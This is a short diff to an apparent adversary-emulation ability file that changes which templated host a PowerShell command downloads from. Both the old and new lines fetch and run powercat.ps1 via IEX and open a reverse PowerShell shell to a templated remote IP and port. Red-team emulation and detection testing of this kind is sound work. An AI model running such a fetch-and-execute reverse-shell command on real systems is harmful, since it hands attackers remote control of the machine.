@@ -12,7 +12,7 @@ platforms:
   windows:
     psh:
       command: |
-        IEX (New-ObjectNet.WebClient).DownloadString('#{operator.payloads}/450357d476637ba42dc9871717d82b3d3a6d7610/powercat.ps1'); powercat -c #{execution.remote.ip} -p #{execution.remote.port} -e powershell
+        IEX (New-ObjectNet.WebClient).DownloadString('#{operator.http}/450357d476637ba42dc9871717d82b3d3a6d7610/powercat.ps1'); powercat -c #{execution.remote.ip} -p #{execution.remote.port} -e powershell
 metadata:
   authors:
   - bfuzzy1
